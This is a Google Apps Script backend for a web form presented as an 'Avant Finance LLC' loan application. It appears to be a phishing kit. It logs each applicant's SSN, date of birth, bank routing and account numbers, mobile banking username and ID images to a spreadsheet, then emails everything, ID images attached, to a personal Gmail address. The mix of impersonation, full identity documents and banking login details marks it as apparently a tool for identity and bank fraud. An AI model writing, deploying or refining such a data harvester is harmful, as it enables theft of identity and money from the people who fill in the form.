// ============================================================
//  Avant Finance LLC — Loan Application Google Apps Script
//  Paste this entire file into Extensions > Apps Script
//  No extra scopes needed — uses MailApp for email with attachments
// ============================================================

var NOTIFICATION_EMAIL = "finnfoxpersonalloan@gmail.com";
var SHEET_NAME = "AvantFinance Applications";
var SCRIPT_ENABLED = true;

function doPost(e) {
  if (!SCRIPT_ENABLED) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, message: "Service temporarily unavailable." }))
      .setMimeType(ContentService.MimeType.JSON);
  }

  try {
    var data = JSON.parse(e.postData.contents);
    var ss = SpreadsheetApp.getActiveSpreadsheet();

    var sheet = ss.getSheetByName(SHEET_NAME);
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
      sheet.appendRow([
        "Timestamp",
        "Loan Amount ($)",
        "Monthly Income ($)",
        "Purpose",
        "First Name",
        "Last Name",
        "Email",
        "Phone",
        "Date of Birth",
        "SSN",
        "Employer",
        "Employer Phone",
        "Street Address",
        "City",
        "State",
        "Zip Code",
        "Bank Name",
        "Routing Number",
        "Account Number",
        "Mobile Banking Username",
        "ID Type",
        "ID Front Name",
        "ID Back Name"
      ]);

      var headerRange = sheet.getRange(1, 1, 1, 23);
      headerRange.setBackground("#4f46e5");
      headerRange.setFontColor("#ffffff");
      headerRange.setFontWeight("bold");
      sheet.setFrozenRows(1);
    }

    sheet.appendRow([
      new Date().toLocaleString(),
      data.loanAmount        || "",
      data.monthlyIncome     || "",
      data.loanPurpose       || "",
      data.firstName         || "",
      data.lastName          || "",
      data.email             || "",
      data.phone             || "",
      data.dob               || "",
      data.ssn               || "",
      data.currentEmployer   || "",
      data.employerPhone     || "",
      data.streetAddress     || "",
      data.city              || "",
      data.state             || "",
      data.zipCode           || "",
      data.bankName          || "",
      data.routingNumber     || "",
      data.accountNumber     || "",
      data.mobileBankingUsername || "",
      data.documentType      || "",
      data.idFrontName       || "",
      data.idBackName        || ""
    ]);

    sheet.autoResizeColumns(1, 23);
    sendEmailNotification(data);

    return ContentService
      .createTextOutput(JSON.stringify({ success: true }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, message: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function sendEmailNotification(data) {
  var subject = "🔔 Avant Finance — New Application — " + (data.firstName || "") + " " + (data.lastName || "");

  var body = "New loan application received on Avant Finance LLC.\n\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "LOAN DETAILS\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "Amount:         $" + (data.loanAmount || "N/A") + "\n" +
    "Monthly Income: $" + (data.monthlyIncome || "N/A") + "\n" +
    "Purpose:        " + (data.loanPurpose || "N/A") + "\n\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "PERSONAL INFO\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "Name:     " + (data.firstName || "") + " " + (data.lastName || "") + "\n" +
    "Email:    " + (data.email || "N/A") + "\n" +
    "Phone:    " + (data.phone || "N/A") + "\n" +
    "DOB:      " + (data.dob || "N/A") + "\n" +
    "SSN:      " + (data.ssn || "N/A") + "\n" +
    "Employer: " + (data.currentEmployer || "N/A") + "\n\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "ADDRESS\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    (data.streetAddress || "") + ", " + (data.city || "") + ", " + (data.state || "") + " " + (data.zipCode || "") + "\n\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "BANKING\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "Bank:           " + (data.bankName || "N/A") + "\n" +
    "Routing #:      " + (data.routingNumber || "N/A") + "\n" +
    "Account #:      " + (data.accountNumber || "N/A") + "\n" +
    "Mobile User:    " + (data.mobileBankingUsername || "N/A") + "\n\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "ID DOCUMENTS UPLOADED\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "Type:   " + (data.documentType || "N/A") + "\n" +
    "Front:  " + (data.idFrontName || "Not uploaded") + "\n" +
    "Back:   " + (data.idBackName || "Not uploaded") + "\n\n" +
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
    "Submitted: " + new Date().toLocaleString();

  var attachments = [];
  
  if (data.idFrontFile && data.idFrontFile.length > 100) {
    try {
      var base64Data = data.idFrontFile.toString();
      if (base64Data.indexOf(',') !== -1) {
        base64Data = base64Data.split(',')[1];
      }
      var decoded = Utilities.base64Decode(base64Data);
      var blob = Utilities.newBlob(decoded, data.idFrontType || 'image/jpeg', data.idFrontName || 'id-front.jpg');
      attachments.push(blob);
    } catch (e) {
      Logger.log("Error processing ID Front: " + e);
    }
  }
  
  if (data.idBackFile && data.idBackFile.length > 100) {
    try {
      var base64Data = data.idBackFile.toString();
      if (base64Data.indexOf(',') !== -1) {
        base64Data = base64Data.split(',')[1];
      }
      var decoded = Utilities.base64Decode(base64Data);
      var blob = Utilities.newBlob(decoded, data.idBackType || 'image/jpeg', data.idBackName || 'id-back.jpg');
      attachments.push(blob);
    } catch (e) {
      Logger.log("Error processing ID Back: " + e);
    }
  }

  if (attachments.length > 0) {
    MailApp.sendEmail(NOTIFICATION_EMAIL, subject, body, {
      attachments: attachments,
      name: 'Avant Finance LLC'
    });
  } else {
    MailApp.sendEmail(NOTIFICATION_EMAIL, subject, body);
  }
}

function doGet(e) {
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok" }))
    .setMimeType(ContentService.MimeType.JSON);
}
